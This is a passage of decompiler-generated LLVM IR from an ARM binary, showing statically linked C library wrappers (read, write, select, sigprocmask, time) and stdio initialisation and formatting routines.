  uselistorder label %dec_label_pc_142c0, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_142c8 = load i32, i32* @r4, align 4
  store i32 %v3_142c8, i32* %stack_var_-8, align 4
  %v1_142cc = load i32, i32* @r1, align 4
  %v2_142cc = inttoptr i32 %v1_142cc to i32*
  %v3_142cc = load i32, i32* @r2, align 4
  %v4_142cc = call i32 @read(i32 %arg1, i32* %v2_142cc, i32 %v3_142cc)
  store i32 %v4_142cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_142cc, -4095
  br i1 %tmp, label %dec_label_pc_142ec, label %dec_label_pc_142dc

dec_label_pc_142dc:                               ; preds = %entry
  %v0_142dc = call i32 @__errno_location()
  %v0_142e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_142e0 = sub i32 0, %v0_142e0
  %v2_142e4 = inttoptr i32 %v0_142dc to i32*
  store i32 %v1_142e0, i32* %v2_142e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142ec

dec_label_pc_142ec:                               ; preds = %entry, %dec_label_pc_142dc
  %v0_142ec = phi i32 [ %v4_142cc, %entry ], [ -1, %dec_label_pc_142dc ]
  %v2_142f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_142f0, i32* @r4, align 4
  ret i32 %v0_142ec

; uselistorder directives
  uselistorder i32 %v4_142cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_142ec, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_142f4 = load i32, i32* @r4, align 4
  store i32 %v3_142f4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1431c, label %dec_label_pc_1430c

dec_label_pc_1430c:                               ; preds = %entry
  %v0_1430c = call i32 @__errno_location()
  %v0_14310 = load i32, i32* %r4.global-to-local, align 4
  %v1_14310 = sub i32 0, %v0_14310
  %v2_14314 = inttoptr i32 %v0_1430c to i32*
  store i32 %v1_14310, i32* %v2_14314, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14320.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1431c

dec_label_pc_1431c:                               ; preds = %entry, %dec_label_pc_1430c
  %v2_14320 = phi i32 [ %v3_142f4, %entry ], [ %v2_14320.pre, %dec_label_pc_1430c ]
  %v0_1431c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1430c ]
  store i32 %v2_14320, i32* @r4, align 4
  ret i32 %v0_1431c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1431c, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14324 = load i32, i32* @r4, align 4
  store i32 %v3_14324, i32* %stack_var_-8, align 4
  %v0_14328 = call i32 @setsid()
  store i32 %v0_14328, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14328, -4095
  br i1 %tmp, label %dec_label_pc_14348, label %dec_label_pc_14338

dec_label_pc_14338:                               ; preds = %entry
  %v0_14338 = call i32 @__errno_location()
  %v0_1433c = load i32, i32* %r4.global-to-local, align 4
  %v1_1433c = sub i32 0, %v0_1433c
  %v2_14340 = inttoptr i32 %v0_14338 to i32*
  store i32 %v1_1433c, i32* %v2_14340, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14348

dec_label_pc_14348:                               ; preds = %entry, %dec_label_pc_14338
  %v0_14348 = phi i32 [ %v0_14328, %entry ], [ -1, %dec_label_pc_14338 ]
  %v2_1434c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1434c, i32* @r4, align 4
  ret i32 %v0_14348

; uselistorder directives
  uselistorder i32 %v0_14328, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14348, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14350 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_14350, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_143585 = load i32, i32* @r4, align 4
  store i32 %v3_143585, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14378

bb:                                               ; preds = %entry
  %v3_14358 = load i32, i32* @r4, align 4
  store i32 %v3_14358, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_14378, label %dec_label_pc_14364

dec_label_pc_14364:                               ; preds = %bb
  %v0_14364 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14370 = inttoptr i32 %v0_14364 to i32*
  store i32 22, i32* %v2_14370, align 4
  %v0_1439c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1439c

dec_label_pc_14378:                               ; preds = %.thread, %bb
  %v7_14378 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_14378, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_14378, -4095
  br i1 %tmp13, label %dec_label_pc_14398, label %dec_label_pc_14388

dec_label_pc_14388:                               ; preds = %dec_label_pc_14378
  %v0_14388 = call i32 @__errno_location()
  %v0_1438c = load i32, i32* %r4.global-to-local, align 4
  %v1_1438c = sub i32 0, %v0_1438c
  %v2_14390 = inttoptr i32 %v0_14388 to i32*
  store i32 %v1_1438c, i32* %v2_14390, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14398

dec_label_pc_14398:                               ; preds = %dec_label_pc_14378, %dec_label_pc_14388
  %v0_14398 = phi i32 [ %v7_14378, %dec_label_pc_14378 ], [ -1, %dec_label_pc_14388 ]
  store i32 %v0_14398, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1439c

dec_label_pc_1439c:                               ; preds = %dec_label_pc_14364, %dec_label_pc_14398
  %v0_1439c = phi i32 [ %v0_1439c.pre, %dec_label_pc_14364 ], [ %v0_14398, %dec_label_pc_14398 ]
  %v2_143a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_143a0, i32* @r4, align 4
  ret i32 %v0_1439c

; uselistorder directives
  uselistorder i32 %v7_14378, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1439c, { 1, 0 }
  uselistorder label %dec_label_pc_14398, { 1, 0 }
  uselistorder label %dec_label_pc_14378, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_143a4 = load i32, i32* @r4, align 4
  store i32 %v3_143a4, i32* %stack_var_-8, align 4
  %v2_143a8 = call i32 @time(i32* %arg1)
  store i32 %v2_143a8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_143a8, -4095
  br i1 %tmp, label %dec_label_pc_143c8, label %dec_label_pc_143b8

dec_label_pc_143b8:                               ; preds = %entry
  %v0_143b8 = call i32 @__errno_location()
  %v0_143bc = load i32, i32* %r4.global-to-local, align 4
  %v1_143bc = sub i32 0, %v0_143bc
  %v2_143c0 = inttoptr i32 %v0_143b8 to i32*
  store i32 %v1_143bc, i32* %v2_143c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_143c8

dec_label_pc_143c8:                               ; preds = %entry, %dec_label_pc_143b8
  %v0_143c8 = phi i32 [ %v2_143a8, %entry ], [ -1, %dec_label_pc_143b8 ]
  %v2_143cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_143cc, i32* @r4, align 4
  ret i32 %v0_143c8

; uselistorder directives
  uselistorder i32 %v2_143a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_143c8, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_143d4 = call i32 @wait4()
  ret i32 %v0_143d4
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_143d8 = load i32, i32* @r4, align 4
  store i32 %v3_143d8, i32* %stack_var_-8, align 4
  %v3_143dc = load i32, i32* @r2, align 4
  %v4_143dc = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_143dc)
  store i32 %v4_143dc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_143dc, -4095
  br i1 %tmp, label %dec_label_pc_143fc, label %dec_label_pc_143ec

dec_label_pc_143ec:                               ; preds = %entry
  %v0_143ec = call i32 @__errno_location()
  %v0_143f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_143f0 = sub i32 0, %v0_143f0
  %v2_143f4 = inttoptr i32 %v0_143ec to i32*
  store i32 %v1_143f0, i32* %v2_143f4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_143fc

dec_label_pc_143fc:                               ; preds = %entry, %dec_label_pc_143ec
  %v0_143fc = phi i32 [ %v4_143dc, %entry ], [ -1, %dec_label_pc_143ec ]
  %v2_14400 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14400, i32* @r4, align 4
  ret i32 %v0_143fc

; uselistorder directives
  uselistorder i32 %v4_143dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_143fc, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_14408 = load i32, i32* @global_var_288c8, align 4
  %v3_1440c = mul i32 %arg1, 2
  %v4_1440c = add i32 %v2_14408, %v3_1440c
  %v5_1440c = inttoptr i32 %v4_1440c to i8*
  %v6_1440c = load i8, i8* %v5_1440c, align 1
  %v8_1440c = zext i8 %v6_1440c to i32
  %v1_14410 = and i32 %v8_1440c, 32
  ret i32 %v1_14410
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_14424 = icmp slt i32 %arg1, 0
  br i1 %v1_14424, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_14424 = mul i32 %arg1, 2
  %v2_14430 = load i32, i32* @global_var_288d0, align 4
  %v2_14434 = add i32 %v2_14430, %v2_14424
  %v3_14438 = inttoptr i32 %v2_14434 to i8*
  %v4_14438 = load i8, i8* %v3_14438, align 1
  %v6_14438 = zext i8 %v4_14438 to i32
  %v1_1443c = add i32 %v2_14434, 1
  %v2_1443c = inttoptr i32 %v1_1443c to i8*
  %v3_1443c = load i8, i8* %v2_1443c, align 1
  %v4_1443c = zext i8 %v3_1443c to i32
  %v3_14440 = mul nuw i32 %v4_1443c, 16777216
  %v4_14444 = sdiv i32 %v3_14440, 65536
  %v5_14444 = or i32 %v4_14444, %v6_14438
  ret i32 %v5_14444

; uselistorder directives
  uselistorder i32 %v2_14434, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2ee94.881 to i32)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-4, align 4
  %v2_144a4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_144a4, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_144b4 = call i32 @__GI_vsnprintf()
  ret i32 %v0_144b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_144d4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_144d4, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_144e8 = call i32 @__GI_vsnprintf()
  ret i32 %v0_144e8

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_144fc = load i32, i32* @r4, align 4
  %v6_144fc = load i32, i32* @r5, align 4
  %v12_144fc = load i32, i32* @r7, align 4
  %v15_144fc = load i32, i32* @r8, align 4
  %v18_144fc = load i32, i32* @sl, align 4
  %v0_14500 = load i32, i32* @r3, align 4
  store i32 %v0_14500, i32* @r8, align 4
  %v2_14504 = ptrtoint i32* %stack_var_-108 to i32
  %v0_1450c = load i32, i32* @r0, align 4
  %v1_1450c = sub i32 -1, %v0_1450c
  store i32 %v1_1450c, i32* @r5, align 4
  store i32 %v0_1450c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_14520 = load i32, i32* @r1, align 4
  %v3_14520 = icmp ult i32 %v1_1450c, %v1_14520
  br i1 %v3_14520, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_14520, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_14528 = load i32, i32* @r2, align 4
  store i32 %v0_14528, i32* @r7, align 4
  %v2_1452c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1452c, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_14548 = call i32 @__stdio_init_mutex()
  %v0_1454c = load i32, i32* @r4, align 4
  %v1_1454c = load i32, i32* @r5, align 4
  %v0_14554 = load i32, i32* @r7, align 4
  %v0_14558 = load i32, i32* @r8, align 4
  %v3_14578 = inttoptr i32 %v0_14554 to i8*
  %v4_14578 = call i32 @_vfprintf_internal(i32 %v2_14504, i8* %v3_14578, i32 %v0_14558)
  %v0_1457c = load i32, i32* @r5, align 4
  %v1_1457c = load i32, i32* @sl, align 4
  %v9_1457c = icmp eq i32 %v0_1457c, %v1_1457c
  br i1 %v9_1457c, label %dec_label_pc_145a4, label %dec_label_pc_14588

dec_label_pc_14588:                               ; preds = %bb23
  %v9_14590 = icmp eq i32 %v1_1454c, 0
  %v1_14594 = sext i1 %v9_14590 to i32
  %v1_14594.v0_14570 = add i32 %v0_1454c, %v1_14594
  %stack_var_-92.0 = inttoptr i32 %v1_14594.v0_14570 to i8*
  %v1_145a0 = trunc i32 %v1_1457c to i8
  store i8 %v1_145a0, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_145a4

dec_label_pc_145a4:                               ; preds = %bb23, %dec_label_pc_14588
  store i32 %v3_144fc, i32* @r4, align 4
  store i32 %v6_144fc, i32* @r5, align 4
  store i32 %v12_144fc, i32* @r7, align 4
  store i32 %v15_144fc, i32* @r8, align 4
  store i32 %v18_144fc, i32* @sl, align 4
  ret i32 %v4_14578

; uselistorder directives
  uselistorder i32 %v1_14520, { 1, 0 }
  uselistorder i32 %v0_1450c, { 1, 0 }
  uselistorder label %dec_label_pc_145a4, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_145ac = load i32, i32* @r4, align 4
  store i32 %v3_145ac, i32* %stack_var_-24, align 4
  %v9_145ac = load i32, i32* @r6, align 4
  %v0_145b0 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_28920.876 to i32), i32* @r4, align 4
  %v3_145b8 = load i8, i8* @global_var_28921.883, align 1
  %v4_145b8 = zext i8 %v3_145b8 to i32
  %v2_145bc = load i8, i8* bitcast (i8** @global_var_28920.876 to i8*), align 4
  %v3_145bc = zext i8 %v2_145bc to i32
  store i32 %v0_145b0, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_145c8 = mul nuw nsw i32 %v4_145b8, 256
  %v5_145c8 = or i32 %v3_145bc, %v4_145c8
  store i32 %v5_145c8, i32* @r6, align 4
  %v1_145cc = inttoptr i32 %v0_145b0 to i32*
  %v2_145cc = load i32, i32* %v1_145cc, align 4
  store i32 %v2_145cc, i32* %r8.global-to-local, align 4
  %v1_145d0 = call i32 @isatty(i32 0)
  %v1_145d4 = sub i32 1, %v1_145d0
  %v0_145d8 = load i32, i32* @r6, align 4
  %v4_145d8 = mul i32 %v1_145d4, 256
  %v5_145d8 = xor i32 %v4_145d8, %v0_145d8
  %v3_145dc = load i8, i8* @global_var_28971.884, align 1
  %v4_145dc = zext i8 %v3_145dc to i32
  %v3_145e0 = load i8, i8* @global_var_28970.877, align 1
  %v4_145e0 = zext i8 %v3_145e0 to i32
  %v3_145e4 = sdiv i32 %v5_145d8, 256
  store i32 1, i32* @r0, align 4
  %v4_145ec = mul nuw nsw i32 %v4_145dc, 256
  %v5_145ec = or i32 %v4_145e0, %v4_145ec
  store i32 %v5_145ec, i32* @r5, align 4
  %v1_145f0 = trunc i32 %v3_145e4 to i8
  store i8 %v1_145f0, i8* @global_var_28921.883, align 1
  %v1_145f4 = trunc i32 %v0_145d8 to i8
  %v2_145f4 = load i32, i32* @r4, align 4
  %v3_145f4 = inttoptr i32 %v2_145f4 to i8*
  store i8 %v1_145f4, i8* %v3_145f4, align 1
  %v1_145f8 = call i32 @isatty(i32 1)
  %v1_145fc = sub i32 1, %v1_145f8
  %v0_14600 = load i32, i32* @r5, align 4
  %v4_14600 = mul i32 %v1_145fc, 256
  %v5_14600 = xor i32 %v4_14600, %v0_14600
  store i32 %v5_14600, i32* %r5.global-to-local, align 4
  %v3_14604 = sdiv i32 %v5_14600, 256
  %v1_14608 = trunc i32 %v3_14604 to i8
  store i8 %v1_14608, i8* @global_var_28971.884, align 1
  %v0_1460c = load i32, i32* %r8.global-to-local, align 4
  %v1_1460c = load i32, i32* @r7, align 4
  %v2_1460c = inttoptr i32 %v1_1460c to i32*
  store i32 %v0_1460c, i32* %v2_1460c, align 4
  %v0_14610 = load i32, i32* %r5.global-to-local, align 4
  %v1_14610 = trunc i32 %v0_14610 to i8
  store i8 %v1_14610, i8* @global_var_28970.877, align 1
  %v2_14614 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14614, i32* @r4, align 4
  store i32 %v9_145ac, i32* @r6, align 4
  ret i32 %v1_145fc

; uselistorder directives
  uselistorder i32 %v1_145fc, { 1, 0 }
  uselistorder i32 %v0_145d8, { 1, 0 }
  uselistorder i8* @global_var_28970.877, { 1, 0 }
  uselistorder i8* @global_var_28971.884, { 1, 0 }
  uselistorder i8* @global_var_28921.883, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1f610.886 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_14624 = call i32 @memcpy()
  %v0_14628 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14628, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v1_14628 = load i32, i32* @r1, align 4
  %v3_14628 = load i32, i32* @r6, align 4
  %v8_14628 = shl i32 %v0_14624, %v3_14628
  %v9_14628 = and i32 %v8_14628, %v1_14628
  call void @__pseudo_branch(i32 %v9_14628)
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  ret i32 %v0_14624

; uselistorder directives
  uselistorder i32 %v0_14624, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1462c = load i32, i32* @r4, align 4
  store i32 %v3_1462c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_288ec.888 to i32), i32* @r0, align 4
  %v0_14634 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_28904.890 to i32), i32* @r0, align 4
  %v0_1463c = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_288e8.892 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_288e8.892 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_146986 = add i32 %storemerge5, 56
  store i32 %v1_146986, i32* @r5, align 4
  %v2_1469c8 = icmp eq i32 %storemerge5, 0
  store i32 %v1_146986, i32* %r0.global-to-local, align 4
  br i1 %v2_1469c8, label %dec_label_pc_146a8, label %dec_label_pc_1464c

dec_label_pc_1464c:                               ; preds = %entry, %dec_label_pc_14688
  store i32 ptrtoint (i8* @global_var_176c8.894 to i32), i32* %r3.global-to-local, align 4
  store i32 83544, i32* @lr, align 4
  %v1_14654 = call i32 @__pthread_return_0()
  %v2_14658 = icmp eq i32 %v1_14654, 0
  %v0_1465c = load i32, i32* @r5, align 4
  store i32 %v0_1465c, i32* @r0, align 4
  br i1 %v2_14658, label %dec_label_pc_14688, label %dec_label_pc_14664

dec_label_pc_14664:                               ; preds = %dec_label_pc_1464c
  %v0_14664 = load i32, i32* @r4, align 4
  %v1_14664 = add i32 %v0_14664, 8
  %v2_14664 = inttoptr i32 %v1_14664 to i32*
  %v3_14664 = load i32, i32* %v2_14664, align 4
  store i32 %v3_14664, i32* %r3.global-to-local, align 4
  %v3_1466c = inttoptr i32 %v0_14664 to i8*
  store i8 48, i8* %v3_1466c, align 1
  %v2_14674 = load i32, i32* @r4, align 4
  %v3_14674 = add i32 %v2_14674, 1
  %v4_14674 = inttoptr i32 %v3_14674 to i8*
  store i8 0, i8* %v4_14674, align 1
  %v0_14678 = load i32, i32* %r3.global-to-local, align 4
  %v1_14678 = load i32, i32* @r4, align 4
  %v2_14678 = add i32 %v1_14678, 20
  %v3_14678 = inttoptr i32 %v2_14678 to i32*
  store i32 %v0_14678, i32* %v3_14678, align 4
  %v0_1467c = load i32, i32* %r3.global-to-local, align 4
  %v1_1467c = load i32, i32* @r4, align 4
  %v2_1467c = add i32 %v1_1467c, 24
  %v3_1467c = inttoptr i32 %v2_1467c to i32*
  store i32 %v0_1467c, i32* %v3_1467c, align 4
  %v0_14680 = load i32, i32* %r3.global-to-local, align 4
  %v1_14680 = load i32, i32* @r4, align 4
  %v2_14680 = add i32 %v1_14680, 28
  %v3_14680 = inttoptr i32 %v2_14680 to i32*
  store i32 %v0_14680, i32* %v3_14680, align 4
  %v0_14684 = load i32, i32* %r3.global-to-local, align 4
  %v1_14684 = load i32, i32* @r4, align 4
  %v2_14684 = add i32 %v1_14684, 16
  %v3_14684 = inttoptr i32 %v2_14684 to i32*
  store i32 %v0_14684, i32* %v3_14684, align 4
  br label %dec_label_pc_14688

dec_label_pc_14688:                               ; preds = %dec_label_pc_1464c, %dec_label_pc_14664
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_1468c = load i32, i32* @r4, align 4
  %v2_1468c = add i32 %v1_1468c, 52
  %v3_1468c = inttoptr i32 %v2_1468c to i32*
  store i32 1, i32* %v3_1468c, align 4
  %v0_14690 = call i32 @__stdio_init_mutex()
  store i32 %v0_14690, i32* %r0.global-to-local, align 4
  %v0_14694 = load i32, i32* @r4, align 4
  %v1_14694 = add i32 %v0_14694, 32
  %v2_14694 = inttoptr i32 %v1_14694 to i32*
  %storemerge = load i32, i32* %v2_14694, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_14698 = add i32 %storemerge, 56
  store i32 %v1_14698, i32* @r5, align 4
  %v2_1469c = icmp eq i32 %storemerge, 0
  store i32 %v1_14698, i32* %r0.global-to-local, align 4
  br i1 %v2_1469c, label %dec_label_pc_14698.dec_label_pc_146a8_crit_edge, label %dec_label_pc_1464c

dec_label_pc_14698.dec_label_pc_146a8_crit_edge:  ; preds = %dec_label_pc_14688
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_288e8.892 to i32*), align 4
  br label %dec_label_pc_146a8

dec_label_pc_146a8:                               ; preds = %dec_label_pc_14698.dec_label_pc_146a8_crit_edge, %entry
  %v11_146d013 = phi i32 [ %v1_14698, %dec_label_pc_14698.dec_label_pc_146a8_crit_edge ], [ %v1_146986, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_14698.dec_label_pc_146a8_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_288e8.892 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_146c84 = icmp eq i32 %storemerge12, 0
  br i1 %v2_146c84, label %dec_label_pc_146d0, label %dec_label_pc_146b4

dec_label_pc_146b4:                               ; preds = %dec_label_pc_146a8, %dec_label_pc_146b4
  %v0_146bc = phi i32 [ %storemerge1, %dec_label_pc_146b4 ], [ %storemerge12, %dec_label_pc_146a8 ]
  %v1_146b4 = inttoptr i32 %v0_146bc to i8*
  %v2_146b4 = load i8, i8* %v1_146b4, align 1
  %v3_146b4 = zext i8 %v2_146b4 to i32
  store i32 %v3_146b4, i32* %r3.global-to-local, align 4
  %v1_146b8 = and i32 %v3_146b4, 64
  store i32 %v0_146bc, i32* %r0.global-to-local, align 4
  store i32 83652, i32* @lr, align 4
  %v1_146c0 = icmp ne i32 %v1_146b8, 0
  call void @__pseudo_cond_branch(i1 %v1_146c0, i32 ptrtoint (i32* @global_var_146e4.895 to i32))
  %v0_146c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_146c4 = add i32 %v0_146c4, 32
  %v2_146c4 = inttoptr i32 %v1_146c4 to i32*
  %storemerge1 = load i32, i32* %v2_146c4, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_146c8 = icmp eq i32 %storemerge1, 0
  br i1 %v2_146c8, label %dec_label_pc_146c8.dec_label_pc_146d0_crit_edge, label %dec_label_pc_146b4

dec_label_pc_146c8.dec_label_pc_146d0_crit_edge:  ; preds = %dec_label_pc_146b4
  %v11_146d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146d0

dec_label_pc_146d0:                               ; preds = %dec_label_pc_146c8.dec_label_pc_146d0_crit_edge, %dec_label_pc_146a8
  %v11_146d0 = phi i32 [ %v11_146d0.pre, %dec_label_pc_146c8.dec_label_pc_146d0_crit_edge ], [ %v11_146d013, %dec_label_pc_146a8 ]
  %v2_146d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_146d0, i32* @r4, align 4
  ret i32 %v11_146d0

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_146b4, { 1, 0 }
  uselistorder label %dec_label_pc_14688, { 1, 0 }
  uselistorder label %dec_label_pc_1464c, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_146e4 = load i32, i32* @r4, align 4
  store i32 %v3_146e4, i32* %stack_var_-8, align 4
  %v0_146e8 = load i32, i32* @r0, align 4
  %v1_146e8 = add i32 %v0_146e8, 8
  %v2_146e8 = inttoptr i32 %v1_146e8 to i32*
  %v3_146e8 = load i32, i32* %v2_146e8, align 4
  %v1_146ec = add i32 %v0_146e8, 16
  %v2_146ec = inttoptr i32 %v1_146ec to i32*
  %v3_146ec = load i32, i32* %v2_146ec, align 4
  %v9_146f0 = icmp eq i32 %v3_146ec, %v3_146e8
  store i32 %v0_146e8, i32* %r4.global-to-local, align 4
  br i1 %v9_146f0, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_146e8, i32* %v2_146ec, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 83716, i32* @lr, align 4
  %v1_14700 = xor i1 %v9_146f0, true
  call void @__pseudo_cond_branch(i1 %v1_14700, i32 ptrtoint (i32* @global_var_17db0.896 to i32))
  %v0_14704 = load i32, i32* %r4.global-to-local, align 4
  %v1_14704 = add i32 %v0_14704, 8
  %v2_14704 = inttoptr i32 %v1_14704 to i32*
  %v3_14704 = load i32, i32* %v2_14704, align 4
  %v1_14708 = add i32 %v0_14704, 16
  %v2_14708 = inttoptr i32 %v1_14708 to i32*
  %v3_14708 = load i32, i32* %v2_14708, align 4
  %v2_1470c = sub i32 %v3_14708, %v3_14704
  %v2_14710 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14710, i32* @r4, align 4
  ret i32 %v2_1470c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_14718 = load i32, i32* @r0, align 4
  %v1_14718 = add i32 %v0_14718, 52
